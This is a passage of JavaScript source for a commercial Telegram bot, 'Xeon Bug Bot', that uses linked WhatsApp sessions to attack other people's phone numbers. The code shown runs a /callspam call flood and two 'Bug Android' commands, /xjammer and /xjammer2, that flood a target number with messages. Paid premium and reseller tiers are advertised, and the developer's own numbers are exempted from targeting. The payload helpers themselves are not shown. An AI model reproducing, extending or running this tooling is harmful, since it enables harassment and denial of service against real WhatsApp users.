        await userBot.sendMessage(chatId, `❌ Failed to send call offer ${i + 1}/30 to ${numberTarget}.`);
        break;
      }
      await sleep(2000); // 2-second delay
    }

    await userBot.sendMessage(chatId, `✅ Completed sending 30 call offers to ${numberTarget}.`);
  } catch (error) {
    console.error(`Error in /callspam for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /callspam: ${error.message}`);
  }
});

// Register the /xjammer command
botInstance.onText(/\/xjammer(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xjammer raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!db.premiumUsers.includes(senderId)) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: @DGXeon13

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 25$
✅ Script no enc 100%: 100$`);
  }

  console.log(`[DEBUG] /xjammer input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xjammer: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xjammer +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xjammer: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xjammer: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xjammer: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xjammer: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg', {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sending messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await sendMessagesForDurationX(1, formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /xjammer for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xjammer: ${error.message}`);
  }
});

// Register the /xjammer2 command
botInstance.onText(/\/xjammer2(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xjammer2 raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!db.premiumUsers.includes(senderId)) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: @DGXeon13

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 25$
✅ Script no enc 100%: 100$`);
  }

  console.log(`[DEBUG] /xjammer2 input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /xjammer2: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xjammer2 +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /xjammer2: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xjammer2: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xjammer2: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xjammer2: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg', {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sending messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await sendMessagesForDuration(1, formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /xjammer2 for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xjammer2: ${error.message}`);
  }
});

  botInstance.onText(/\/deltoken(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a bot token.\nExample: /deltoken 1234567890:AAH...');
    }

    const botToken = match[1].trim();
    if (!db.botTokens.includes(botToken)) {
      return userBot.sendMessage(chatId, '❌ Token not found.');
    }

    db.botTokens = db.botTokens.filter(t => t !== botToken);
    saveJson('./database/bot_tokens.json', db.botTokens);

    const botKey = Array.from(botInstances.keys()).find(key => {
      const bot = botInstances.get(key);
      return bot.token === botToken;
    });

    if (botKey) {
      botInstances.get(botKey).stopPolling();
      botInstances.delete(botKey);
      console.log(`Stopped and removed bot: ${botKey}`);
    }

    await userBot.sendMessage(chatId, `✅ Bot token removed successfully.`);
  });

  botInstance.onText(/\/addtoken(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!db.premiumUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only premium users, resellers, or owners can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a valid Telegram bot token.\nExample: /addtoken 1234567890:AAH1a2b3c4d5e6g7h8i9j0k');
    }

    const botToken = match[1].trim();

    if (!/^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(botToken)) {
      return userBot.sendMessage(chatId, '❌ Invalid bot token format. It should be like: 1234567890:AAH1a2b3c4d5f6g7i8j0k1l2m5n6p');
    }

    if (db.botTokens.includes(botToken)) {
      return userBot.sendMessage(chatId, '❌ This bot token is already added.');
    }

    try {
      const newBot = new TelegramBot(botToken, { polling: true });
      const botInfo = await newBot.getMe();

      if (!botInfo || !botInfo.id) {
        return userBot.sendMessage(chatId, '❌ Invalid bot token. Could not authenticate with Telegram.');
      }

      const botKey = `@${botInfo.username}`;
      botInstances.set(botKey, newBot);
      db.botTokens.push(botToken);
      saveJson('./database/bot_tokens.json', db.botTokens);
      console.log(`Bot token added for @${botInfo.username}`);
      registerCommandHandlers(newBot, false);
      await userBot.sendMessage(chatId, `✅ Bot token added successfully. Bot @${botInfo.username} is now active and can be used by all users.`);
    } catch (error) {
      console.error(`Error in /addtoken for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to add bot token: ${error.message}`);
    }
  });

  botInstance.onText(/\/addprem(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /addprem 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (!db.premiumUsers.includes(userId)) {
      db.premiumUsers.push(userId);
      saveJson('./database/premium.json', db.premiumUsers);
      console.log(`${senderId} added ${userId} to premium`);
      await userBot.sendMessage(chatId, `✅ User ${userId} added to premium.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is already premium.`);
    }
  });

  botInstance.onText(/\/delprem(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /delprem 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.premiumUsers.includes(userId)) {
      db.premiumUsers = db.premiumUsers.filter((id) => id !== userId);
      saveJson('./database/premium.json', db.premiumUsers);
      console.log(`${senderId} removed ${userId} from premium`);
      await userBot.sendMessage(chatId, `✅ User ${userId} removed from premium.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is not premium.`);
    }
  });

  botInstance.onText(/\/listprem(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
    }

    if (db.premiumUsers.length === 0) {
      return userBot.sendMessage(chatId, '❌ No premium users found.');
    }

    try {
      const TELEGRAM_LIMIT = 4096;
      const messageParts = [];
      let currentPart = '┌──────┤ Premium Users List (Part 1) ├──────┐\n';
      let partNumber = 1;

      for (const userId of db.premiumUsers) {
        try {
          const chat = await userBot.getChat(userId);
          const username = chat.username ? `@${chat.username}` : 'No Username';
          const entry = `│➻ ID: ${userId}\n│➻ Username: ${username}\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Premium Users List (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        } catch (error) {
          console.warn(`Error fetching chat for premium user ${userId}: ${error.message}`);
          const entry = `│➻ ID: ${userId}\n│➻ Username: Error fetching\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Premium Users List (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        }
      }

      if (currentPart.length > '┌──────┤ Premium Users List (Part 1) ├──────┐\n'.length) {
        currentPart += '└────────────────────────┘';
        messageParts.push(currentPart);
      }

      for (const part of messageParts) {
        await userBot.sendMessage(chatId, part);
        await new Promise((resolve) => setTimeout(resolve, 100));
      }
    } catch (error) {
      console.error(`Error in /listprem for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to generate premium user list: ${error.message}`);
    }
  });

  botInstance.onText(/\/addresell(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /addresell 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (!db.OwnerUsers.includes(userId)) {
      db.OwnerUsers.push(userId);
      saveJson('./database/Owner.json', db.OwnerUsers);
      console.log(`${senderId} added ${userId} to resellers`);
      await userBot.sendMessage(chatId, `✅ User ${userId} added as reseller.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is already a reseller.`);
    }
  });

  botInstance.onText(/\/delresell(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only developer can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /delresell 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.OwnerUsers.includes(userId)) {
      db.OwnerUsers = db.OwnerUsers.filter((id) => id !== userId);
      saveJson('./database/Owner.json', db.OwnerUsers);
      console.log(`${senderId} removed ${userId} from resellers`);
      await userBot.sendMessage(chatId, `✅ User ${userId} removed from resellers.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is not a reseller.`);
    }
  });

  botInstance.onText(/\/listresell(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

    if (db.OwnerUsers.length === 0) {
      return userBot.sendMessage(chatId, '❌ No resellers found.');
    }

    try {
      const TELEGRAM_LIMIT = 4096;
      const messageParts = [];
      let currentPart = '┌──────┤ Resellers List (Part 1) ├──────┐\n';
      let partNumber = 1;

      for (const userId of db.OwnerUsers) {
        try {
          const chat = await userBot.getChat(userId);
          const username = chat.username ? `@${chat.username}` : 'No Username';
          const entry = `│➻ ID: ${userId}\n│➻ Username: ${username}\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Resellers List (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        } catch (error) {
          console.warn(`Error fetching chat for reseller ${userId}: ${error.message}`);
          const entry = `│➻ ID: ${userId}\n│➻ Username: Error fetching\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Resellers List (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        }
      }

      if (currentPart.length > '┌──────┤ Resellers List (Part 1) ├──────┐\n'.length) {
        currentPart += '└────────────────────────┘';
        messageParts.push(currentPart);
      }

      for (const part of messageParts) {
        await userBot.sendMessage(chatId, part);
        await new Promise((resolve) => setTimeout(resolve, 100));
      }
    } catch (error) {
      console.error(`Error in /listresell for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to generate reseller list: ${error.message}`);
    }
  });

  botInstance.onText(/\/listuser(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners can use this command.');
    }

    if (Object.keys(db.userNumbers).length === 0) {
      return userBot.sendMessage(chatId, '❌ No users have connected WhatsApp numbers.');
    }

    try {
      const TELEGRAM_LIMIT = 4096;
      const messageParts = [];
      let currentPart = '┌──────┤ Connected Users (Part 1) ├──────┐\n';
      let partNumber = 1;

      for (const [userId, number] of Object.entries(db.userNumbers)) {
        try {
          const chat = await userBot.getChat(userId);
          const username = chat.username ? `@${chat.username}` : 'No Username';
          const entry = `│➻ ID: ${userId}\n│➻ Username: ${username}\n│➻ Number: ${number}\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Connected Users (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        } catch (error) {
          console.warn(`Error fetching chat for user ${userId}: ${error.message}`);
          const entry = `│➻ ID: ${userId}\n│➻ Username: Error fetching\n│➻ Number: ${number}\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Connected Users (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        }
      }

      if (currentPart.length > '┌──────┤ Connected Users (Part 1) ├──────┐\n'.length) {
        currentPart += '└────────────────────────┘';
        messageParts.push(currentPart);
      }

      for (const part of messageParts) {
        await userBot.sendMessage(chatId, part);
        await new Promise((resolve) => setTimeout(resolve, 100));
      }
    } catch (error) {
      console.error(`Error in /listuser for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to generate user list: ${error.message}`);
    }
  });

  botInstance.onText(/\/listtoken(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
    }

    if (db.botTokens.length === 0) {
      return userBot.sendMessage(chatId, '❌ No bot tokens have been added.');
    }

    try {
      const TELEGRAM_LIMIT = 4096;
      const messageParts = [];
      let currentPart = '┌──────┤ Bot Tokens List (Part 1) ├──────┐\n';
      let partNumber = 1;
      const isOwner = CONFIG.owner.includes(senderId);

      for (const botToken of db.botTokens) {
        try {
          const tempBot = new TelegramBot(botToken);
          const botInfo = await tempBot.getMe();
          const username = botInfo.username ? `@${botInfo.username}` : 'Unknown';
          const displayedToken = isOwner ? botToken : `${botToken.slice(0, 10)}...${botToken.slice(-5)}`;
          const entry = `│➻ Bot Username: ${username}\n│➻ Token: <code>${displayedToken}</code>\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Bot Tokens List (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        } catch (error) {
          console.warn(`Error fetching bot info for token: ${error.message}`);
          const displayedToken = isOwner ? botToken : `${botToken.slice(0, 10)}...${botToken.slice(-5)}`;
          const entry = `│➻ Bot Username: Error fetching\n│➻ Token: <code>${displayedToken}</code>\n│\n`;

          if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
            currentPart += entry;
          } else {
            currentPart += '└────────────────────────┘';
            messageParts.push(currentPart);

            partNumber++;
            currentPart = `┌──────┤ Bot Tokens List (Part ${partNumber}) ├──────┐\n`;
            currentPart += entry;
          }
        }
      }

      if (currentPart.length > '┌──────┤ Bot Tokens List (Part 1) ├──────┐\n'.length) {
        currentPart += '└────────────────────────┘';
        messageParts.push(currentPart);
      }

      for (const part of messageParts) {
        await userBot.sendMessage(chatId, part, { parse_mode: 'HTML' });
        await new Promise((resolve) => setTimeout(resolve, 100));
      }
    } catch (error) {
      console.error(`Error in /listtoken for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to generate bot token list: ${error.message}`);
    }
  });
  
  botInstance.onText(/\/mytoken/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!db.premiumUsers.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only premium users can use this command.');
  }

  const userToken = db.botTokens.find(token => {
    try {
      const tempBot = new TelegramBot(token);
      return tempBot.getMe().then(botInfo => botInstances.get(`@${botInfo.username}`)?.token === token);
    } catch {
      return false;
    }
  });

  if (!userToken) {
    return userBot.sendMessage(chatId, '❌ No bot token found for your account.');
  }

  try {
    const botInfo = await new TelegramBot(userToken).getMe();
    const botUsername = botInfo.username ? `@${botInfo.username}` : 'Unknown';
    await userBot.sendMessage(chatId, `┌──────┤ Your Bot Token ├──────┐
│➻ Bot Username: ${botUsername}
│➻ Token: <code>${userToken}</code>
└────────────────────────┘`, { parse_mode: 'HTML' });
  } catch (error) {
    console.error(`Error in /mytoken for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Failed to retrieve bot token: ${error.message}`);
  }
});
  
  botInstance.onText(/\/(info|checkid|id|getid)(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const command = match[1]; // Captures the command used (info, checkid, id, getid)
  const input = match[2]?.trim(); // Captures the optional input (username, channel, group, etc.)
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') {
    return;
  }

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  if (!checkRateLimit(senderId, chatId)) return;

  try {
    // Case 1: No input provided, return sender's ID
    if (!input) {
      const senderUsername = msg.from.username ? `@${msg.from.username}` : 'No Username';
      await userBot.sendMessage(chatId, `┌──────┤ Your ID ├──────┐
│➻ User ID: <code>${senderId}</code>
│➻ Username: ${senderUsername}
└────────────────────────┘`, { parse_mode: 'HTML' });
      return;
    }

    // Case 2: Input is a username (e.g., @username)
    if (input.startsWith('@')) {
      try {
        const chat = await userBot.getChat(input);
        if (chat.type === 'private') {
          await userBot.sendMessage(chatId, `┌──────┤ User Info ├──────┐
│➻ User ID: <code>${chat.id}</code>
│➻ Username: ${input}
└────────────────────────┘`, { parse_mode: 'HTML' });
        } else if (chat.type === 'group' || chat.type === 'supergroup' || chat.type === 'channel') {
          await userBot.sendMessage(chatId, `┌──────┤ ${chat.type.charAt(0).toUpperCase() + chat.type.slice(1)} Info ├──────┐
│➻ Chat ID: <code>${chat.id}</code>
│➻ Title: ${chat.title || input}
└────────────────────────┘`, { parse_mode: 'HTML' });
        } else {
          await userBot.sendMessage(chatId, `❌ Invalid entity: ${input} is not a user, group, or channel.`);
        }
      } catch (error) {
        console.error(`Error fetching chat for ${input}: ${error.message}`);
        await userBot.sendMessage(chatId, `❌ Could not find user or chat for ${input}. Ensure the username is correct and the bot has access.`);
      }
      return;
    }

    // Case 3: Input is a Telegram invite link (e.g., https://t.me/+abc123 or https://t.me/channel_name)
    if (input.startsWith('https://t.me/')) {
      const chatIdentifier = input.replace('https://t.me/', '').replace(/^\+/, '');
      try {
        const chat = await userBot.getChat(`@${chatIdentifier}`); // Convert to @username format
        if (chat.type === 'group' || chat.type === 'supergroup' || chat.type === 'channel') {
          await userBot.sendMessage(chatId, `┌──────┤ ${chat.type.charAt(0).toUpperCase() + chat.type.slice(1)} Info ├──────┐
│➻ Chat ID: <code>${chat.id}</code>
│➻ Title: ${chat.title || chatIdentifier}
└────────────────────────┘`, { parse_mode: 'HTML' });
        } else {
          await userBot.sendMessage(chatId, `❌ Invalid link: ${input} does not point to a group or channel.`);
        }
      } catch (error) {
        console.error(`Error fetching chat for ${chatIdentifier}: ${error.message}`);
        await userBot.sendMessage(chatId, `❌ Could not find group or channel for ${input}. Ensure the link is correct and the bot has access.`);
      }
      return;
    }

    // Case 4: Input is invalid
    await userBot.sendMessage(chatId, `❌ Invalid input. Use a Telegram username (e.g., @username) or a valid Telegram invite link (e.g., https://t.me/channel_name).`);
  } catch (error) {
    console.error(`Error in /${command} for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Error processing /${command}: ${error.message}`);
  }
});

  botInstance.onText(/\/checkmembership(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const userBot = getUserBot(botInstance);
    console.log(`Manual membership check requested by ${senderId} in chat ${chatId}`);

    const cacheKey = `${senderId}:membership`;
    membershipCache.delete(cacheKey);

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (membership.isMember) {
      await userBot.sendMessage(chatId, `✅ Membership verified! You are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`);
    }
  });

  botInstance.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const queryId = callbackQuery.id;
    const action = callbackQuery.data;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const isPremium = db.premiumUsers.includes(senderId);

    const userBot = getUserBot(botInstance);

    console.log(`Handling callback ${action} for chat ${chatId} by bot ${await botInstance.getMe().then(info => `@${info.username}`)}`);

    try {
      await userBot.answerCallbackQuery(queryId, { cache_time: 0 });
    } catch (err) {
      console.error(`Failed to answer callback query ${queryId}: ${err.message}`);
    }

    try {
      if (action === 'check_membership') {
        const cacheKey = `${senderId}:membership`;
        membershipCache.delete(cacheKey);

        const membership = await checkMembership(chatId, senderId, isRootBot);
        if (membership.isMember) {
          await userBot.sendMessage(chatId, `✅ Membership verified! You are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`);
        }
        return;
      }

      const membership = await checkMembership(chatId, senderId, isRootBot);
      if (!membership.isMember) return;

      let caption;
      let buttons = [[{ text: '〢Contact', url: 'https://t.me/dgxeon13' }]];

      if (action === 'bugmenu') {
        caption = `
┌──────┤ Xeon Bug Bot ├──────┐
│➻ Name: ${senderName}
│➻ Developer: @dgxeon13
│➻ Status: ${isPremium ? 'Premium' : 'No Access'}
│➻ Online: ${getOnlineDuration()}
└──────────────────────┘
┌──────┤ Bug Android ├──────┐
│➻ xjammer <num>
│➻ xjammer2 <num>
└──────────────────────┘`;
      } else if (action === 'miscmenu') {
        caption = `
┌──────┤ Xeon Bug Bot ├──────┐
│➻ Owner name: ${senderName}
│➻ Developer: @dgxeon13
│➻ Status: ${isPremium ? 'Premium' : 'No Access'}
│➻ Online: ${getOnlineDuration()}
└──────────────────────┘
┌──────┤ Misc Menu ├──────┐
│➻ reqpair <Num>
│➻ delpair <Num>
│➻ addprem <ID>
│➻ delprem <ID>
│➻ addresell <ID>
│➻ delresell <ID>
│➻ addtoken <tkn>
│➻ deltoken <tkn>
│➻ listprem 
│➻ listresell 
│➻ listtoken
│➻ listuser
│➻ mytoken
│➻ info <username/grblink/chlink>
└──────────────────────┘`;
      } else {
        await userBot.sendMessage(chatId, '❌ Invalid action.');
        return;
      }

      let retries = 3;
      while (retries > 0) {
        try {
          await userBot.sendPhoto(chatId, 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg', {
            caption,
            reply_markup: { inline_keyboard: buttons },
          });
          break;
        } catch (err) {
          retries--;
          if (retries === 0) throw err;
          console.warn(`Retrying sendPhoto for chat ${chatId}, attempt ${4 - retries}: ${err.message}`);
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    } catch (err) {
      console.error(`Callback Query Error for user ${senderId}, action ${action}: ${err.message}`);
      try {
        await userBot.sendMessage(chatId, `❌ Error processing request: ${err.message}`);
      } catch (sendErr) {
        console.error(`Failed to send error message to ${chatId}: ${sendErr.message}`);
      }
    }
  });
}

registerCommandHandlers(bot, true);

